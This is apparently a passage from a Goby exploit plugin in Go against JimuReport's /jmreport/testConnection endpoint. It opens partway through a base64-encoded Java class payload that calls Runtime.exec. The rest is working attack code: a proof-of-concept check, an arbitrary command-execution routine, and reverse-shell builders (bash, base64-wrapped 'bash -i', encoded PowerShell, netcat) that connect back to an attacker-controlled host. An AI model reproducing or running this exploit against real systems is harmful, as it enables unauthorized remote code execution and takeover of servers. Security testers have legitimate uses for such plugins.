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')", "dbName": "383BAb7deFC825E6", "dbPassword": "917982", "userName": "917982"}`
		resp, err := httpclient.DoHttpRequest(hostInfo, post)
		if err != nil {
			return "", "", nil
		}
		//漏洞url地址
		url := "/jmreport/testConnection"

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := resp.Utf8Html

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash12343512

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash12343512

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "Bypowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
